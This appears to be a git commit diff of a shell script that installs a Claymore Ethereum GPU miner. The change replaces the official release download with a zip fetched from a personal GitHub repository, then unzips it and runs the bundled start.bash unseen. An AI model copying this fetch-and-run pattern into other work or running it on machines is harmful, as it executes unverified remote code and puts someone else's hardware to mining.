3de1d31f5d4556b6e65740fd6c1ee0865a31608c
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-10-18 09:04:59 +0200

    Update claymoreminer.sh

--- claymoreminer.sh
+++ claymoreminer.sh
@@ -1,6 +1,10 @@
 #!/bin/sh
-wget https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip
-unzip Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip
-cd "Claymore's Dual Ethereum AMD+NVIDIA GPU Miner v15.0 - LINUX"/
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ClayMore.zip
+unzip ClayMore.zip
+chmod +x start.bash
 chmod +x ethdcrminer64
-./ethdcrminer64 -epool stratum+ssl://us1.ethermine.org:5555 -ewal 0x8CB8003E428D0Fd7693D22f576A212403728c64a -eworker ClayMoreMiner -epsw x -mode 1 -dbg -1 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -ttli 77 -tstop 89
+chmod +x 1_Ethereum-hiveon.bash
+chmod +x 2_Ethereum-ethermine.bash
+chmod +x 3_Ethereum-miningpoolhub.bash
+chmod +x 4_Ethereum-cruxpool.bash
+./start.bash
